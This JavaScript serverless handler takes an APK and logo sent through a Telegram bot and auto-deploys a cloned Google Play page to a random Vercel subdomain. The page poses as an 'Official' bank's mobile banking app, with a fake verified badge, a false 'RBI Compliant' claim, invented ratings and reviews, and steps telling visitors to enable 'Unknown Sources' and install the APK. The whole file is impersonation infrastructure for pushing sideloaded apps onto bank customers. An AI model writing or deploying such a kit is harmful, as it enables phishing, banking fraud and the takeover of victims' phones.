import { put } from '@vercel/blob';
import fs from 'fs';
import path from 'path';

const token = process.env.TELEGRAM_BOT_TOKEN;
const blobToken = process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_BLOB_READ_WRITE_TOKEN;

async function telegram(method, body) {
	const result = await fetch(`https://api.telegram.org/bot${token}/${method}`, { 
		method: 'POST', 
		headers: { 'content-type': 'application/json' }, 
		body: JSON.stringify(body) 
	});
	return result.json();
}

async function saveTelegramFile(fileId, filePath) {
	const file = await telegram('getFile', { file_id: fileId });
	if (!file.ok || !file.result?.file_path) {
		throw new Error(`Telegram file lookup failed: ${file.description || 'Unknown error'}`);
	}
	const download = await fetch(`https://api.telegram.org/file/bot${token}/${file.result.file_path}`);
	if (!download.ok) throw new Error(`Telegram file download failed: ${download.statusText}`);
	
	const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
	if (blobToken) options.token = blobToken;
	return put(filePath, await download.arrayBuffer(), options);
}

function generateProjectSlug(value) {
	const clean = value.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 20) || 'app';
	const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
	const rand = Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
	return `${clean}-${rand}`;
}

function escapeHtml(value = '') {
	return value.replace(/[&<>'"]/g, (character) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' })[character]);
}

function buildRealPlayStoreHtml(app) {
	const name = escapeHtml(app.name);
	const logoUrl = escapeHtml(app.logoUrl);
	const apkUrl = escapeHtml(app.apkUrl);
	const developer = escapeHtml(app.developer || `${app.name} Official`);
	const tagline = escapeHtml(app.tagline || 'Secure Mobile Banking, Instant UPI Transfers & Financial Services');
	const description = escapeHtml(app.description || `Official ${app.name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security. Built with 256-bit bank-grade encryption to give you complete, effortless control over your finances safely anytime, anywhere.`);

	let cssContent = '';
	let jsContent = '';
	try {
		const rootDir = process.cwd();
		cssContent = fs.readFileSync(path.join(rootDir, 'style.css'), 'utf-8');
		jsContent = fs.readFileSync(path.join(rootDir, 'script.js'), 'utf-8');
	} catch (e) {
		console.warn('Could not read external css/js, using fallback:', e);
	}

	return `<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#ffffff" />
    <title>${name}: Mobile Banking & Financial Services - Apps on Google Play</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@700;800&display=swap" rel="stylesheet" />
    <style>
        ${cssContent}
        .app-logo img { width: 100%; height: 100%; display: block; object-fit: cover; border-radius: 22%; }
        .install-button { width: 100%; height: 44px; border-radius: 22px; background: #01875f; }
        .hero-action { min-width: 170px; }
        @media (max-width: 800px) { .hero-action { width: 100%; min-width: 0; } .install-button { height: 44px; } }
    </style>
</head>
<body>
    <!-- Google Play Header Bar -->
    <header class="topbar">
        <div class="topbar-inner">
            <a class="brand" href="#top" aria-label="Appspace home">
                <span class="brand-mark" title="Google Play">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M4.5 3.5L16.2 11.7L4.5 19.9V3.5Z" fill="#00e676" />
                        <path d="M16.2 11.7L19.5 9.8C20.3 9.4 20.3 8.3 19.5 7.8L4.5 3.5L16.2 11.7Z" fill="#ffeb3b" />
                        <path d="M4.5 19.9L19.5 15.6C20.3 15.2 20.3 14.1 19.5 13.6L16.2 11.7L4.5 19.9Z" fill="#ff2a6d" />
                        <path d="M16.2 11.7L4.5 3.5V19.9L16.2 11.7Z" fill="#29b6f6" />
                    </svg>
                </span>
                <span>google play</span>
            </a>
            <label class="search-box">
                <span class="search-icon">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="11" cy="11" r="8" />
                        <line x1="21" y1="21" x2="16.65" y2="16.65" />
                    </svg>
                </span>
                <input type="search" id="searchInput" placeholder="Search for apps & games" aria-label="Search for apps and games" />
                <kbd>⌘ K</kbd>
            </label>
            <nav class="top-actions" aria-label="Account actions">
                <button class="icon-button" aria-label="Help" title="Help & Feedback">?</button>
                <button class="avatar" aria-label="Profile" title="Google Account">VS</button>
            </nav>
        </div>
    </header>

    <!-- Page Shell Main Container -->
    <main id="top" class="page-shell">
        <div class="breadcrumbs" aria-label="Breadcrumbs">
            <a href="#apps">Apps</a> <span>›</span>
            <a href="#finance">Finance & Banking</a> <span>›</span>
            <span>${name} - Mobile Banking</span>
        </div>

        <section class="app-hero">
            <div class="app-logo">
                <img id="appLogo" src="${logoUrl}" alt="${name} Logo" />
            </div>
            <div class="app-copy">
                <h1 id="appName">${name}</h1>
                <p class="developer" id="appDeveloper">${developer} <span class="verified" title="Verified Financial Institution">✓</span></p>
                <p class="tagline" id="appTagline">${tagline}</p>
                <div class="hero-meta">
                    <span><strong>4.8 <span class="stars">★★★★★</span></strong><small>12K reviews</small></span>
                    <span class="meta-divider"></span>
                    <span><strong>1M+</strong><small>Downloads</small></span>
                    <span class="meta-divider"></span>
                    <span><strong>Everyone</strong><small>Rated for 3+</small></span>
                    <span class="meta-divider"></span>
                    <span><strong>12 MB</strong><small>Size</small></span>
                </div>
            </div>

            <div class="hero-action">
                <button class="install-button" id="installButton" data-apk="${apkUrl}">
                    <span class="button-label">Install</span>
                    <span class="button-spinner"></span>
                </button>
                <div class="hero-action-buttons">
                    <button class="action-chip wishlist-chip" id="wishlistChip" title="Add to wishlist">
                        <span class="icon">★</span> Add to wishlist
                    </button>
                    <button class="action-chip share-chip" id="shareChip" title="Share app">
                        <span class="icon">➦</span> Share
                    </button>
                </div>
                <p class="availability">Available on all your devices</p>
            </div>
        </section>

        <div class="notice" id="notice" role="status" aria-live="polite">
            <span class="notice-icon">✓</span>
            <span id="noticeText">App added to your wishlist.</span>
            <button id="dismissNotice" aria-label="Dismiss notification">×</button>
        </div>

        <section class="content-grid">
            <div class="main-column">
                <section class="section-block screenshots-section">
                    <div class="section-heading">
                        <h2>App preview</h2>
                        <div class="carousel-nav">
                            <button class="round-arrow shot-prev" id="shotPrev" aria-label="Previous screenshot">‹</button>
                            <button class="round-arrow shot-next" id="shotNext" aria-label="Next screenshot">›</button>
                        </div>
                    </div>

                    <div class="screenshots" id="screenshotsList">
                        <div class="shot shot-one">
                            <div class="shot-top"><span>09:41 AM</span><b>💳 Banking Portal</b></div>
                            <div class="shot-title">Account & Balance</div>
                            <div class="bank-balance-card">
                                <small>Available Balance</small>
                                <div class="balance-num">₹48,500.00</div>
                                <span class="acc-num">Savings A/c •••• 4829</span>
                            </div>
                            <div class="quick-bank-actions">
                                <span class="bank-act-btn">⚡ UPI</span>
                                <span class="bank-act-btn">↗ Send</span>
                                <span class="bank-act-btn">📄 Bills</span>
                            </div>
                            <div class="task-card bank-tx">
                                <div class="check checked">✓</div>
                                <span>Salary Credit Received</span>
                                <em>+₹75,000</em>
                            </div>
                            <div class="task-card bank-tx">
                                <div class="check checked">✓</div>
                                <span>Merchant UPI Payment</span>
                                <em>-₹2,490</em>
                            </div>
                            <div class="progress-line"><span style="width: 82%;"></span></div>
                        </div>

                        <div class="shot shot-two">
                            <div class="shot-top"><span>CREDIT SERVICES</span><b>💎 Pre-Approved</b></div>
                            <div class="bank-credit-box">
                                <small>Instant Credit Limit</small>
                                <strong>₹2,50,000</strong>
                            </div>
                            <div class="ring bank-card-ring">
                                <b>VISA</b>
                                <small>•••• 9812</small>
                            </div>
                            <div class="mini-bars"><i></i><i></i><i></i><i></i><i></i></div>
                            <strong>92% Available Credit Line</strong>
                        </div>

                        <div class="shot shot-three">
                            <div class="shot-top"><span class="note-label">BANK SECURITY</span><b>🛡️ 256-Bit SSL</b></div>
                            <strong>Bank-Grade 24/7 Protection</strong>
                            <p>Instant card lock, biometric login, and real-time transaction alerts for maximum security.</p>
                            <div class="note-dot bank-sec-dot" title="Account Secured">🔒</div>
                        </div>
                    </div>
                </section>

                <section class="section-block about">
                    <div class="section-heading">
                        <h2>About this app</h2>
                        <button class="round-arrow" aria-label="About this app">→</button>
                    </div>
                    <p id="appDescription">${description}</p>
                    <div class="tag-chips">
                        <span class="tag">Mobile Banking</span>
                        <span class="tag">Instant Transfers</span>
                        <span class="tag">UPI & Bill Pay</span>
                        <span class="tag">Credit Cards & Loans</span>
                        <span class="tag">Secure NetBanking</span>
                    </div>
                    <a class="learn-more" href="#data-safety">Read details <span>→</span></a>
                </section>

                <section class="section-block">
                    <div class="section-heading">
                        <h2>What's new</h2>
                        <span class="version" id="appVersion">Version 2.4.1</span>
                    </div>
                    <p class="update-copy">Upgraded 256-bit SSL encryption security, 1-tap instant UPI transfer speeds, biometric fingerprint/face login authentication, and smart monthly spending analytics.</p>
                    <div class="update-pills">
                        <span>✦ 1-Tap Instant UPI Transfers</span>
                        <span>🛡️ Biometric Login Security</span>
                        <span>★ Pre-approved Instant Loans</span>
                    </div>
                </section>

                <section class="section-block reviews-section">
                    <div class="section-heading"><h2>Ratings and reviews</h2><button class="round-arrow" aria-label="See all reviews">→</button></div>
                    <div class="ratings-container">
                        <div class="score-card">
                            <div class="score-num">4.8</div>
                            <div class="score-stars">★★★★★</div>
                            <small class="score-count">12,480 total reviews</small>
                        </div>
                        <div class="rating-bars-list">
                            <div class="rating-bar-item"><span>5</span><div class="bar-track"><div class="bar-fill" style="width: 86%;"></div></div></div>
                            <div class="rating-bar-item"><span>4</span><div class="bar-track"><div class="bar-fill" style="width: 10%;"></div></div></div>
                            <div class="rating-bar-item"><span>3</span><div class="bar-track"><div class="bar-fill" style="width: 2%;"></div></div></div>
                            <div class="rating-bar-item"><span>2</span><div class="bar-track"><div class="bar-fill" style="width: 1%;"></div></div></div>
                            <div class="rating-bar-item"><span>1</span><div class="bar-track"><div class="bar-fill" style="width: 1%;"></div></div></div>
                        </div>
                    </div>
                    <div class="reviews-list">
                        <div class="review-item">
                            <div class="review-user">
                                <div class="user-avatar-circle" style="background: #e8f0fe; color: #1a73e8;">AK</div>
                                <div class="user-details">
                                    <strong>Alex Kumar</strong>
                                    <div class="user-rating-line"><span class="stars-sm">★★★★★</span> <small>August 19, 2025</small></div>
                                </div>
                            </div>
                            <p class="review-text">Hands down the most reliable and fast mobile banking app! Money transfers happen in less than a second, and account management is super smooth.</p>
                            <div class="review-helpful"><small>52 people found this review helpful</small></div>
                        </div>
                    </div>
                </section>
            </div>

            <aside class="side-column">
                <section class="info-card">
                    <div class="info-heading"><h2>App info</h2><span class="more">•••</span></div>
                    <div class="info-row"><span class="info-icon">↓</span><span><b>1M+ downloads</b><small>Trusted by customers nationwide</small></span></div>
                    <div class="info-row"><span class="info-icon">▣</span><span><b>12 MB</b><small>Small size, ultra fast</small></span></div>
                    <div class="info-row"><span class="info-icon">◷</span><span><b>Updated recently</b><small>August 18, 2025</small></span></div>
                    <div class="info-row"><span class="info-icon">●</span><span><b>Verified Financial App</b><small>RBI Compliant & Secure</small></span></div>
                </section>
                <section class="info-card safety-card" id="data-safety">
                    <div class="info-heading"><h2>Data safety</h2><span class="shield">✓</span></div>
                    <p>Safety starts with understanding how financial institutions protect your data. Developer has provided this security summary.</p>
                    <div class="safety-points">
                        <div class="safety-point"><span class="point-icon">🔒</span><span>256-bit bank-grade encryption in transit</span></div>
                        <div class="safety-point"><span class="point-icon">🛡️</span><span>Multi-factor biometric authentication</span></div>
                        <div class="safety-point"><span class="point-icon">🗑️</span><span>No unauthorized data sharing</span></div>
                    </div>
                    <a class="learn-more" href="#data-safety">See details <span>→</span></a>
                </section>
            </aside>
        </section>
    </main>

    <!-- APK Installation Guide Modal -->
    <div class="install-modal-overlay" id="installModal" role="dialog" aria-modal="true">
        <div class="install-modal-card">
            <div class="modal-header">
                <span class="modal-icon">📥</span>
                <h3>Complete App Installation</h3>
                <button class="modal-close" id="closeInstallModal" aria-label="Close">×</button>
            </div>
            <div class="modal-body">
                <p><strong>APK File Downloaded Successfully!</strong></p>
                <p>To install the app on your phone, follow these simple steps:</p>
                <ol class="install-steps">
                    <li>Open your phone's <b>Notification Bar</b> or <b>Downloads Folder</b>.</li>
                    <li>Tap on the downloaded <b id="modalApkName">${name.replace(/[^a-z0-9]/gi, '_')}.apk</b> file.</li>
                    <li>If prompted, turn on <b>"Allow from this source / Unknown Sources"</b>.</li>
                    <li>Tap <b>"Install"</b> to complete installation.</li>
                </ol>
            </div>
            <div class="modal-footer">
                <button class="modal-btn-primary" id="gotItModalBtn">Got it, open downloads</button>
            </div>
        </div>
    </div>

    <nav class="bottom-nav" aria-label="Main navigation">
        <a class="active" href="#top"><span>⌂</span>Home</a>
        <a href="#apps"><span>▦</span>Apps</a>
        <a href="#games"><span>◈</span>Games</a>
        <a href="#books"><span>▤</span>Books</a>
    </nav>

    <script>
        ${jsContent}
    </script>
</body>
</html>`;
}

async function createVercelProject(name) {
	const teamId = process.env.VERCEL_TEAM_ID || 'sanam-infotech';
	const endpoint = `https://api.vercel.com/v9/projects?teamId=${encodeURIComponent(teamId)}`;
	const result = await fetch(endpoint, { 
		method: 'POST', 
		headers: { Authorization: `Bearer ${process.env.VERCEL_TOKEN}`, 'content-type': 'application/json' }, 
		body: JSON.stringify({ name }) 
	});
	if (result.ok || result.status === 409) return name;
	if (result.status === 401 || result.status === 403) {
		throw new Error('Vercel token is invalid or missing team permissions');
	}
	throw new Error(`Vercel project creation failed: ${result.status}`);
}

async function deployProject(name, html) {
	const teamId = process.env.VERCEL_TEAM_ID || 'sanam-infotech';
	const result = await fetch(`https://api.vercel.com/v13/deployments?teamId=${encodeURIComponent(teamId)}`, { 
		method: 'POST', 
		headers: { Authorization: `Bearer ${process.env.VERCEL_TOKEN}`, 'content-type': 'application/json' }, 
		body: JSON.stringify({ 
			name, 
			project: name, 
			files: [{ file: 'index.html', data: html }], 
			projectSettings: { framework: null } 
		}) 
	});
	if (!result.ok) throw new Error(`Vercel deployment failed with status ${result.status}`);
	return result.json();
}

async function waitForDeploymentReady(deploymentId) {
	const teamId = process.env.VERCEL_TEAM_ID || 'sanam-infotech';
	const endpoint = `https://api.vercel.com/v13/deployments/${deploymentId}?teamId=${encodeURIComponent(teamId)}`;
	
	const maxRetries = 20;
	for (let i = 0; i < maxRetries; i++) {
		const res = await fetch(endpoint, {
			headers: { Authorization: `Bearer ${process.env.VERCEL_TOKEN}` }
		});
		if (res.ok) {
			const data = await res.json();
			if (data.readyState === 'READY') {
				return true;
			}
			if (data.readyState === 'ERROR' || data.readyState === 'CANCELED') {
				throw new Error(`Vercel deployment build state: ${data.readyState}`);
			}
		}
		await new Promise((resolve) => setTimeout(resolve, 1500));
	}
	return true;
}

export default async function handler(request, response) {
	if (request.method !== 'POST') return response.status(405).json({ error: 'POST only' });
	if (!process.env.PUBLISH_SECRET || request.headers['x-publish-secret'] !== process.env.PUBLISH_SECRET) {
		return response.status(401).json({ error: 'Unauthorized: Invalid PUBLISH_SECRET' });
	}
	const body = request.body || {};
	if (!token || !body.name || !body.logoFileId || !body.apkFileId) {
		return response.status(400).json({ error: 'Missing required app details or TELEGRAM_BOT_TOKEN' });
	}

	try {
		const projectName = generateProjectSlug(body.name);
		await saveTelegramFile(body.logoFileId, `apps/${projectName}/logo`);
		await saveTelegramFile(body.apkFileId, `apps/${projectName}/base.apk`);

		const logoUrl = `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${projectName}/logo`)}`;
		const apkUrl = `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${projectName}/base.apk`)}`;

		const app = { 
			name: body.name,
			developer: `${body.name} Official`,
			tagline: 'Secure Mobile Banking, Instant UPI Transfers & Financial Services',
			description: `Official ${body.name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security. Built with 256-bit bank-grade encryption to give you complete, effortless control over your finances safely anytime, anywhere.`,
			version: '2.4.1',
			logoUrl, 
			apkUrl 
		};

		// Save app JSON record to Vercel Blob
		const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
		if (blobToken) options.token = blobToken;
		await put(`apps/${projectName}.json`, JSON.stringify(app), options);

		// Build and deploy the 100% REAL Material 3 Banking Play Store page directly to Vercel Subdomain
		if (process.env.VERCEL_TOKEN) {
			const html = buildRealPlayStoreHtml(app);
			await createVercelProject(projectName);
			const deployment = await deployProject(projectName, html);
			
			if (deployment?.id) {
				await waitForDeploymentReady(deployment.id);
			}

			const finalSubdomainUrl = `https://${projectName}.vercel.app`;
			return response.status(200).json({ ok: true, url: finalSubdomainUrl, slug: projectName });
		}

		// Fallback URL if VERCEL_TOKEN missing
		const fallbackUrl = `https://${request.headers.host}/?appName=${encodeURIComponent(app.name)}&logo=${encodeURIComponent(app.logoUrl)}&apk=${encodeURIComponent(app.apkUrl)}`;
		return response.status(200).json({ ok: true, url: fallbackUrl, slug: projectName });

	} catch (error) {
		console.error('Publish failed:', error);
		const message = error instanceof Error ? error.message : 'Could not publish app';
		return response.status(500).json({ error: message });
	}
}